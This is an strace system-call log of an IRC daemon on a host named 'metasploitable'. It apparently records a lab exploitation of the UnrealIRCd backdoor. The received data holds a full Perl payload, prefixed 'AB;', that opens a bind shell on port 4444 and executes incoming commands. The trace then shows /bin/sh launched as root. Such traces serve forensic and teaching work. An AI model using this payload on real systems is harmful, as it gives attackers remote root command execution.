4519  07:31:50.683269 select(1024, [2 3 4 7 9], [], NULL, {0, 810000}) = 1 (in [2], left {0, 620000})
4519  07:31:50.869756 clock_gettime(CLOCK_MONOTONIC, {2320, 686777629}) = 0
4519  07:31:50.869778 accept(2, 0, NULL) = 5
4519  07:31:50.869798 getpeername(5, {sa_family=AF_INET, sin_port=htons(42229), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:31:50.869829 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:31:50.869841 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:31:50.869854 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:31:50.869866 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:31:50.869877 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:31:50.869888 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:31:50.869902 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:31:50.869918 clock_gettime(CLOCK_MONOTONIC, {2320, 686931891}) = 0
4519  07:31:50.869930 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:31:50.869942 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:31:50.869951 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:31:50.869960 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:31:50.869970 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:31:50.869986 send(6, "bO\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:31:50.870078 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:31:50.870132 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n", 70, 0) = 70
4519  07:31:50.870220 gettimeofday({1495625510, 870226}, NULL) = 0
4519  07:31:50.870235 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {0, 990000})
4519  07:31:50.874211 clock_gettime(CLOCK_MONOTONIC, {2320, 691229605}) = 0
4519  07:31:50.874245 recvfrom(6, "bO\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0;\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:31:50.874286 close(6)          = 0
4519  07:31:50.874318 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:31:50.874378 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 104, 0) = 104
4519  07:31:50.874431 time(NULL)        = 1495625510
4519  07:31:50.874444 time(NULL)        = 1495625510
4519  07:31:50.874457 gettimeofday({1495625510, 874461}, NULL) = 0
4519  07:31:50.874469 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:31:50.874511 clock_gettime(CLOCK_MONOTONIC, {2320, 691524404}) = 0
4519  07:31:50.874522 gettimeofday({1495625510, 874525}, NULL) = 0
4519  07:31:50.874532 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:31:50.874571 clock_gettime(CLOCK_MONOTONIC, {2320, 691583452}) = 0
4519  07:31:50.874582 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:31:50.874610 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:31:50.874629 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:31:50.874641 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:31:50.874656 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 10193
10193 07:31:50.874730 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
10193 07:31:50.874745 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
10193 07:31:50.874755 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10193 07:31:50.874768 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
10193 07:31:50.874946 brk(0)            = 0x80f9000
10193 07:31:50.874968 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10193 07:31:50.874983 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fc5000
10193 07:31:50.874999 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
10193 07:31:50.875017 open("/etc/ld.so.cache", O_RDONLY) = 1
10193 07:31:50.875029 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10193 07:31:50.875047 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fbd000
10193 07:31:50.875071 close(1)          = 0
10193 07:31:50.875082 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10193 07:31:50.875097 open("/lib/libncurses.so.5", O_RDONLY) = 1
10193 07:31:50.875110 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
10193 07:31:50.875206 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
10193 07:31:50.875224 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f8d000
10193 07:31:50.875236 mmap2(0xb7fba000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7fba000
10193 07:31:50.875253 close(1)          = 0
10193 07:31:50.875265 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10193 07:31:50.875279 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
10193 07:31:50.875307 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
10193 07:31:50.875446 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
10193 07:31:50.875476 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f89000
10193 07:31:50.875488 mmap2(0xb7f8b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f8b000
10193 07:31:50.875504 close(1)          = 0
10193 07:31:50.875519 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10193 07:31:50.875533 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
10193 07:31:50.875547 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
10193 07:31:50.875636 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
10193 07:31:50.875653 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f88000
10193 07:31:50.875667 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e39000
10193 07:31:50.875678 mmap2(0xb7f82000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f82000
10193 07:31:50.875693 mmap2(0xb7f85000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f85000
10193 07:31:50.875706 close(1)          = 0
10193 07:31:50.875729 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e38000
10193 07:31:50.875740 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e386b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
10193 07:31:50.875812 mprotect(0xb7f82000, 4096, PROT_READ) = 0
10193 07:31:50.875851 munmap(0xb7fbd000, 29913) = 0
10193 07:31:50.875876 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10193 07:31:50.875890 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
10193 07:31:50.875910 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9192d0) = -1 ENOTTY (Inappropriate ioctl for device)
10193 07:31:50.875941 brk(0)            = 0x80f9000
10193 07:31:50.875950 brk(0x80fa000)    = 0x80fa000
10193 07:31:50.875962 brk(0x80fb000)    = 0x80fb000
10193 07:31:50.875978 getuid32()        = 0
10193 07:31:50.875988 getgid32()        = 0
10193 07:31:50.875997 geteuid32()       = 0
10193 07:31:50.876006 getegid32()       = 0
10193 07:31:50.876020 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10193 07:31:50.876034 time(NULL)        = 1495625510
10193 07:31:50.876046 brk(0x80fc000)    = 0x80fc000
10193 07:31:50.876061 brk(0x80fd000)    = 0x80fd000
10193 07:31:50.876080 open("/proc/meminfo", O_RDONLY) = 1
10193 07:31:50.876102 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
10193 07:31:50.876120 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fc4000
10193 07:31:50.876131 read(1, "MemTotal:      1035240 kB\nMemFree:        427048 kB\nBuffers:         76100 kB\nCached:         372876 kB\nSwapCached:          0 kB\nActive:         256252 kB\nInactive:       321656 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        426808 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            4344 kB\nWriteback:           0 kB\nAnonPages:      128988 kB\nMapped:          51956 kB\nSlab:            19008 kB\nSReclaimable:    10444 kB\nSUnreclaim:       8564 kB\nPageTables:       1988 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
10193 07:31:50.876220 close(1)          = 0
10193 07:31:50.876232 munmap(0xb7fc4000, 4096) = 0
10193 07:31:50.876243 brk(0x80fe000)    = 0x80fe000
10193 07:31:50.876270 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
10193 07:31:50.876294 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
10193 07:31:50.876309 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
10193 07:31:50.876321 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
10193 07:31:50.876333 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
10193 07:31:50.876346 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
10193 07:31:50.876359 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10193 07:31:50.876371 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
10193 07:31:50.876384 uname({sys="Linux", node="metasploitable", ...}) = 0
10193 07:31:50.876433 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10193 07:31:50.876451 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
10193 07:31:50.876469 brk(0x8100000)    = 0x8100000
10193 07:31:50.876481 getcwd("/etc/unreal", 4096) = 12
10193 07:31:50.876496 getpid()          = 10193
10193 07:31:50.876512 getppid()         = 4519
10193 07:31:50.876527 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
10193 07:31:50.876547 stat64("/sbin/sh", 0xbf9192a8) = -1 ENOENT (No such file or directory)
10193 07:31:50.876559 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
10193 07:31:50.876577 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
10193 07:31:50.876602 socket(PF_FILE, SOCK_STREAM, 0) = 1
10193 07:31:50.876615 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
10193 07:31:50.876628 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
10193 07:31:50.876649 close(1)          = 0
10193 07:31:50.876660 socket(PF_FILE, SOCK_STREAM, 0) = 1
10193 07:31:50.876670 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
10193 07:31:50.876681 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
10193 07:31:50.876699 close(1)          = 0
10193 07:31:50.876712 open("/etc/nsswitch.conf", O_RDONLY) = 1
10193 07:31:50.876726 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
10193 07:31:50.876743 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fc4000
10193 07:31:50.876754 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
10193 07:31:50.876897 read(1, "", 4096) = 0
10193 07:31:50.876908 close(1)          = 0
10193 07:31:50.876918 munmap(0xb7fc4000, 4096) = 0
10193 07:31:50.876934 open("/etc/ld.so.cache", O_RDONLY) = 1
10193 07:31:50.876946 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10193 07:31:50.876963 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fbd000
10193 07:31:50.876973 close(1)          = 0
10193 07:31:50.876984 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10193 07:31:50.876999 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
10193 07:31:50.877013 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
10193 07:31:50.877106 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
10193 07:31:50.877124 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e2f000
10193 07:31:50.877136 mmap2(0xb7e36000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7e36000
10193 07:31:50.877153 close(1)          = 0
10193 07:31:50.877165 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10193 07:31:50.877178 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
10193 07:31:50.877192 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
10193 07:31:50.877280 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
10193 07:31:50.877297 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e17000
10193 07:31:50.877308 mmap2(0xb7e2b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7e2b000
10193 07:31:50.877323 mmap2(0xb7e2d000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7e2d000
10193 07:31:50.877337 close(1)          = 0
10193 07:31:50.877374 munmap(0xb7fbd000, 29913) = 0
10193 07:31:50.877393 open("/etc/ld.so.cache", O_RDONLY) = 1
10193 07:31:50.877406 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10193 07:31:50.877423 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fbd000
10193 07:31:50.877433 close(1)          = 0
10193 07:31:50.877443 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10193 07:31:50.877458 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
10193 07:31:50.877472 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
10193 07:31:50.877565 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
10193 07:31:50.877583 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e0d000
10193 07:31:50.877594 mmap2(0xb7e15000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7e15000
10193 07:31:50.877611 close(1)          = 0
10193 07:31:50.877623 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
